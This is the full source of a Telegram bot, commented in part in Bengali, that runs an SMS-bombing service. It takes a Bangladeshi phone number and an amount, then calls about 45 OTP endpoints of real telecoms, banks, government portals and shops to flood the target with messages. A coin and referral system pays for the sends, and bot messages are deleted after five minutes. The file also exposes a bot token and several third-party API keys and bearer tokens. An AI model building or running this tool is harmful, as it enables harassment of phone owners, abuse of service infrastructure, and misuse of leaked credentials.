const { Telegraf, session, Markup } = require('telegraf');
const axios = require('axios');
const express = require('express');
const fs = require('fs');

const BOT_TOKEN = '8452171958:AAFElgfh2yXz7VurqsOBZD3AJIpvTCB8GmE';
const ADMIN_ID = 5967798239;
const bot = new Telegraf(BOT_TOKEN);

// Database Initialization
const DB_FILE = './database.json';
let db = {
    users: {}, 
    history: [], 
    restricted: []
};

if (fs.existsSync(DB_FILE)) {
    try { db = JSON.parse(fs.readFileSync(DB_FILE)); } catch (e) { console.error("DB Load Error"); }
}

function saveDB() {
    fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
}

// Render server
const app = express();
app.get('/', (req, res) => res.send('Bot is Running!'));
app.listen(process.env.PORT || 3000);

// API List (আপনার দেওয়া ৪৫+ API এখানে থাকবে)
const SMS_APIS = [
    { url: "https://robiwifi-mw.robi.com.bd/fwa/api/v1/customer/auth/otp/login", method: "POST", headers: { 'Content-Type': 'application/json', 'Referer': 'https://robiwifi.robi.com.bd/' }, data: p => ({ login: p }) },
    { url: "https://weblogin.grameenphone.com/backend/api/v1/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
    { url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login", method: "GET", params: p => ({ msisdn: `880${p}`, lang: "en", ng: "0" }) },
    { url: "https://fundesh.com.bd/api/auth/generateOTP", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p, service_key: "" }) },
    { url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.osudpotro.com/api/v1/users/send_otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://training.gov.bd/backoffice/api/user/sendOtp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://da-api.robi.com.bd/da-nll/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: `880${p}` }) },
    { url: "https://gateway.most.gov.bd/auth/oauth/send-otp", method: "POST", headers: { 'Content-Type': 'application/json', 'X-Api-Key': '4rhwlff8q4q860qsb9utv73x12nua8h7' }, data: p => ({ phone: p, name: "User", email: "a@a.com", registration_type: 1, captcha_token: "511fb2f2ed6211d2a471a7af9a0fa140", otp_send: "SMS" }) },
    { url: "https://app.deshal.net/api/auth/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.shikho.com/auth/v2/send/sms", method: "POST", headers: { 'Content-Type': 'application/json', origin: "https://shikho.com", referer: "https://shikho.com/" }, data: p => ({ phone: "880"+p, type: "student", auth_type: "login", vendor: "shikho" }) },
    { url: "https://api.apex4u.com/api/auth/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phoneNumber: p }) },
    { url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ number: "+880"+p }) },
    { url: "https://bikroy.com/data/phone_number_login/verifications/phone_login", method: "GET", params: p => ({ phone: p }) },
    { url: "https://merchant.pathao.com/api/v1/merchants/verification/phone/send-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phoneNumber: p }) },
    { url: "https://ezybank.dhakabank.com.bd/ekyc/MOBILE_NO_VERIFICATION/MOBILE_NO_VERIFICATION_OTP_GENARATION", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ mobile: p }) },
    { url: "https://cineplex-ticket-api.cineplexbd.com/api/v1/register", method: "POST", headers: { 'Content-Type': 'application/json', appsource: "web" }, data: p => ({ name: "Jubair", msisdn: p, email: "j@j.com", gender: "2", password: "@Test1234", confirm_password: "@Test1234", r_token: "test" }) },
    { url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp", method: "GET", params: p => ({ mobile: p }) },
    { url: "https://api.binge.buzz/api/v4/auth/otp/send", method: "POST", headers: { 'Content-Type': 'application/json', 'x-platform': "web" }, data: p => ({ phone: "+880"+p }) },
    { url: "https://bb-api.bohubrihi.com/public/activity/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p, intent: "login" }) },
    { url: "https://api-gateway.sundarbancourierltd.com/graphql", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ operationName: "CreateAccessToken", variables: { accessTokenFilter: { userName: p } }, query: "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }" }) },
    { url: "https://www.rokomari.com/otp/send", method: "POST", params: p => ({ emailOrPhone: p, countryCode: "BD" }), headers: { 'x-requested-with': "XMLHttpRequest" } },
    { url: "https://offers.sindabad.com/api/mobile-otp", method: "POST", headers: { 'Content-Type': 'application/json', Authorization: "Bearer ODdweWQ2OTJwbDNiYjR6azMyazJpenBrdHQ2MjYybnZhc2luZGFiYWRjb21tb3ppbGxhNTAgbGludXggYW5kcm9pZCAxMyBzbS10ODM3YSBhcHBsZXdlYmtpdDUzNzM2" }, data: p => ({ key: "499a4a6b403417bfd670e45eef1e24b5", mobile: "+88"+p }) },
    { url: "https://piobd.com/login", method: "POST", headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, data: p => `f_mobilenumber=${p}&frf_calculatereg=9` },
    { url: "https://api.shoppingcorner.com.bd/index.php?route=vapi/account/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ number: "+880"+p }) },
    { url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ mobile_no: p }) },
    { url: "https://chinaonlinebd.com/api/login/getOtp", method: "GET", params: p => ({ phone: p }), headers: { token: "45601f3d391886fcec5f5a3f26780f21" } },
    { url: "https://api.bdtickets.com:20100/v1/auth", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ createUserCheck: true, phoneNumber: "+88"+p, applicationChannel: "WEB_APP" }) },
    { url: "https://auth.acsfutureschool.com/api/v1/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://www.shwapno.com/api/auth", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phoneNumber: "+88"+p }) },
    { url: "https://app.eonbazar.com/api/auth/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ method: "otp", mobile: p }) },
    { url: "https://primebazar.com/registration/verification-code-send", method: "POST", headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, data: p => `_token=lCK5AfqQKEpkfPFgzQMNtRx2jD82Yn5fNLrRzmOd&type=customer&phone=${p}&country_code=88` },
    { url: "https://bj-x-coder.top/bo_m_ber.php", method: "GET", params: p => ({ phone: p, amount: 1 }) },
    { url: "https://login.teletalk.com.bd/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: "880" + p }) },
    { url: "https://api.daraz.com.bd/v1/login/send-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "880"+p }) },
    { url: "https://api.evaly.com.bd/api/v1/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "880"+p }) },
    { url: "https://api2.sheba.xyz/v2/auth/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.hungrynaki.com/api/v1/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "880"+p }) },
    { url: "https://api.foodpanda.com.bd/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "+880"+p }) },
    { url: "https://api.10minute.school/api/v1/send-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.bkash.com/checkout/v1.2.0-beta/login/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
    { url: "https://nagad.com.bd/api/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
];

bot.use(session());

// Middleware: Check Ban & Register
bot.use(async (ctx, next) => {
    if (!ctx.from) return next();
    const uid = ctx.from.id;

    if (!db.users[uid]) {
        db.users[uid] = { 
            coins: 50, 
            lastBonus: 0, 
            totalReq: 0, 
            name: ctx.from.first_name || "User",
            isBanned: false,
            banUntil: 0
        };
        saveDB();
    }

    const user = db.users[uid];
    if (user.isBanned && user.banUntil > Date.now()) {
        const remaining = Math.round((user.banUntil - Date.now()) / (1000 * 60 * 60 * 24));
        return ctx.reply(`❌ আপনি ব্যানড! মেয়াদ বাকি: ${remaining} দিন।`);
    } else if (user.isBanned && user.banUntil <= Date.now()) {
        user.isBanned = false;
        saveDB();
    }
    return next();
});

// Keyboards
const mainMenu = Markup.keyboard([
    ['🚀 Boom', '💰 Balance'],
    ['🎁 Daily Bonus', 'ℹ️ Info']
]).resize();

// Auto-delete function
async function autoDelete(ctx, msgId, delay = 300000) { // 5 minutes
    setTimeout(async () => {
        try { await ctx.telegram.deleteMessage(ctx.chat.id, msgId); } catch (e) {}
    }, delay);
}

// Referral & Start
bot.start(async (ctx) => {
    const uid = ctx.from.id;
    const startPayload = ctx.payload; // For Referral links

    if (startPayload && startPayload != uid && db.users[startPayload] && !db.users[uid].referredBy) {
        db.users[startPayload].coins += 100;
        db.users[uid].referredBy = startPayload;
        bot.telegram.sendMessage(startPayload, "🎉 কেউ আপনার লিঙ্কে জয়েন করেছে! ১০০ কয়েন পেয়েছেন।");
        saveDB();
    }

    const msg = await ctx.reply(`👋 স্বাগতম!\nUID: <code>${uid}</code>\n/help দিয়ে কমান্ড লিস্ট দেখুন।`, { parse_mode: 'HTML', ...mainMenu });
    autoDelete(ctx, ctx.message.message_id);
    autoDelete(ctx, msg.message_id);
});

// Admin Commands: Recharge, Ban, RN, List, Broadcast
bot.command('recharge', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const args = ctx.message.text.split(' ');
    if (args.length !== 3) return ctx.reply("Usage: /recharge uid amount");
    const target = args[1], amt = parseInt(args[2]);
    if (db.users[target]) {
        db.users[target].coins += amt;
        saveDB();
        ctx.reply(`✅ Success! New Balance: ${db.users[target].coins}`);
    }
});

bot.command('ban', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const args = ctx.message.text.split(' ');
    const target = args[1], days = parseInt(args[2]) || 365;
    if (db.users[target]) {
        db.users[target].isBanned = true;
        db.users[target].banUntil = Date.now() + (days * 24 * 60 * 60 * 1000);
        saveDB();
        ctx.reply(`🚫 User ${target} banned for ${days} days.`);
    }
});

bot.command('uban', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const target = ctx.message.text.split(' ')[1];
    if (db.users[target]) {
        db.users[target].isBanned = false;
        saveDB();
        ctx.reply("✅ User Unbanned.");
    }
});

bot.command('rn', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const text = ctx.message.text.split(' ')[1];
    if (text.startsWith('-')) {
        const num = text.substring(1);
        db.restricted = db.restricted.filter(n => n !== num);
        ctx.reply("🗑 Restricted number removed.");
    } else {
        db.restricted.push(text);
        ctx.reply("🚫 Number added to restricted list.");
    }
    saveDB();
});

bot.command('list', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const type = ctx.message.text.split(' ')[1];
    if (type === 'user') {
        let list = "👤 **User List:**\n";
        Object.keys(db.users).slice(-15).forEach(id => {
            const u = db.users[id];
            list += `ID: <code>${id}</code> | Bal: ${u.coins} | Req: ${u.totalReq}\n`;
        });
        ctx.reply(list, { parse_mode: 'HTML' });
    } else if (type === 'rn') {
        ctx.reply(`🚫 **Restricted Numbers:**\n${db.restricted.join('\n')}`);
    }
});

// Broadcast System
bot.command('broadcast', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    ctx.session = { step: 'broadcast' };
    ctx.reply("মেসেজটি লিখুন বা ছবি সহ পাঠান:");
});

// History Command
bot.command('history', async (ctx) => {
    const uid = ctx.from.id;
    let logs = [];
    if (uid === ADMIN_ID) {
        logs = db.history.slice(-10).reverse();
    } else {
        logs = db.history.filter(h => h.uid == uid).slice(-10).reverse();
    }

    let text = "📜 **Bombing History:**\n\n";
    logs.forEach(l => {
        text += `📱 ${l.phone} | 🔢 ${l.amount} | 🕒 ${new Date(l.time).toLocaleTimeString()}\n`;
    });
    const msg = await ctx.reply(text || "No history found.", { parse_mode: 'Markdown' });
    autoDelete(ctx, msg.message_id);
});

// Daily Bonus & Referral
async function handleBonus(ctx) {
    const uid = ctx.from.id;
    const diff = (Date.now() - (db.users[uid].lastBonus || 0)) / (1000 * 60 * 60);
    if (diff >= 24) {
        db.users[uid].coins += 50;
        db.users[uid].lastBonus = Date.now();
        saveDB();
        const refLink = `https://t.me/${ctx.botInfo.username}?start=${uid}`;
        ctx.reply(`✅ ৫০ কয়েন বোনাস পেয়েছেন!\n\n🔗 রেফারেল লিঙ্ক:\n${refLink}\n(কেউ জয়েন করলে ১০০ কয়েন পাবেন)`);
    } else {
        ctx.reply(`❌ ${(24 - diff).toFixed(1)} ঘণ্টা বাকি।`);
    }
}

// Bombing Core logic
async function startBombing(ctx, phone, amount) {
    const uid = ctx.from.id;
    if (db.restricted.includes(phone)) return ctx.reply("❌ এই নম্বরটি নিষিদ্ধ (Restricted)!");
    if (db.users[uid].coins < amount) return ctx.reply("❌ পর্যাপ্ত কয়েন নেই!");
    if (amount > 100) return ctx.reply("❌ সর্বোচ্চ ১০০ বার!");

    const statusMsg = await ctx.reply(`🚀 ${phone} নম্বরে কাজ চলছে...`);
    let success = 0, apiIdx = 0;

    while (success < amount) {
        const api = SMS_APIS[apiIdx % SMS_APIS.length];
        apiIdx++;
        try {
            const config = {
                method: api.method, url: api.url, headers: api.headers || {}, timeout: 4000,
                [api.method === 'POST' ? 'data' : 'params']: api.method === 'POST' ? api.data(phone) : api.params(phone)
            };
            await axios(config);
            success++;
        } catch (e) {}
        if (apiIdx > amount + 50) break;
        await new Promise(r => setTimeout(r, 100));
    }

    db.users[uid].coins -= amount;
    db.users[uid].totalReq += 1;
    db.history.push({ uid, phone, amount, time: Date.now() });
    if (db.history.length > 200) db.history.shift(); // Keep DB small
    saveDB();

    const finalMsg = await ctx.reply(`✅ সম্পন্ন!\n🎯 সফল: ${success}\n💰 ব্যালেন্স: ${db.users[uid].coins}`);
    autoDelete(ctx, statusMsg.message_id);
    autoDelete(ctx, finalMsg.message_id);
}

// All Commands & Text Handling
bot.command('help', (ctx) => {
    ctx.reply(`📖 **কমান্ড লিস্ট:**\n/start - শুরু\n/bm <নম্বর> <পরিমাণ>\n/history - হিস্টরি\n/balance - ব্যালেন্স\n/ck - বোনাস\n/info - আইডি তথ্য\n\n👤 Admin: @Tnayem48`);
});

bot.hears('💰 Balance', (ctx) => ctx.reply(`💰 ব্যালেন্স: ${db.users[ctx.from.id].coins} কয়েন`));
bot.hears('ℹ️ Info', (ctx) => ctx.reply(`🆔 UID: <code>${ctx.from.id}</code>\n👤 Admin: @Tnayem48`, { parse_mode: 'HTML' }));
bot.hears('🎁 Daily Bonus', (ctx) => handleBonus(ctx));
bot.hears('🚀 Boom', (ctx) => { ctx.session = { step: 'phone' }; ctx.reply("📱 নম্বর দিন:"); });

bot.on(['text', 'photo'], async (ctx) => {
    const uid = ctx.from.id;

    // Broadcast Logic
    if (ctx.session?.step === 'broadcast' && uid === ADMIN_ID) {
        const users = Object.keys(db.users);
        let count = 0;
        for (const user of users) {
            try {
                if (ctx.message.photo) {
                    await bot.telegram.sendPhoto(user, ctx.message.photo[0].file_id, { caption: ctx.message.caption });
                } else {
                    await bot.telegram.sendMessage(user, ctx.message.text);
                }
                count++;
            } catch (e) {}
        }
        ctx.reply(`✅ ব্রডকাস্ট সফল! ${count} জন ইউজার মেসেজ পেয়েছে।`);
        ctx.session = {};
        return;
    }

    // Bombing input
    if (ctx.session?.step === 'phone') {
        if (/^01[3-9]\d{8}$/.test(ctx.message.text)) {
            ctx.session.phone = ctx.message.text;
            ctx.session.step = 'amt';
            ctx.reply("🔢 পরিমাণ (১-১০০):");
        } else ctx.reply("❌ ভুল নম্বর!");
    } else if (ctx.session?.step === 'amt') {
        startBombing(ctx, ctx.session.phone, parseInt(ctx.message.text));
        ctx.session = {};
    }
});

bot.command('bm', (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length === 3) startBombing(ctx, args[1], parseInt(args[2]));
});

bot.launch().then(() => console.log("Bot Live!"));
